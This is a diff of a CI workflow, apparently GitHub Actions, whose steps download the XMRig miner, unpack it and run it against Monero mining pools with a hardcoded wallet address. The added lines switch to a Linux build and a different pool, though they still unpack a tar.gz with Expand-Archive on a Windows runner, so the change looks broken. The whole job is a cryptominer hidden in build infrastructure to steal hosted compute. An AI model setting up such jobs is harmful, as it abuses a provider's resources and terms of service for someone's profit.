@@ -7,10 +7,10 @@ jobs:
     runs-on: windows-latest
     steps:
     - name: Preparing
-      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-gcc-win64.zip -OutFile xmrig-6.14.1-gcc-win64.zip
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz -OutFile xmrig-6.14.1-linux-x64.tar.gz 
     - name: Prepare_Q2
-      run: Expand-Archive xmrig-6.14.1-gcc-win64.zip
+      run: Expand-Archive xmrig-6.14.1-linux-x64.tar.gz
     - name: Running
-      run: .\xmrig-6.14.1-gcc-win64\xmrig.exe -o pool.supportxmr.com:443 -u 84bZxvjSjgThMYY9NqQvxH9T81VGxS1mZVXt4d6YjxcmMc77M4LTtBFDn2fo3qhaEN9z4M34XE8PrbXtY4RWQRzWJkxUc8k -k --tls -p vps
+      run: .\xmrig-6.14.1\xmrig --coin monero -o stratum+tcp://us-west.minexmr.com:4444 -u 84bZxvjSjgThMYY9NqQvxH9T81VGxS1mZVXt4d6YjxcmMc77M4LTtBFDn2fo3qhaEN9z4M34XE8PrbXtY4RWQRzWJkxUc8k.MadTestCPU7 --threads=4
     - name: DONE
       run: exit
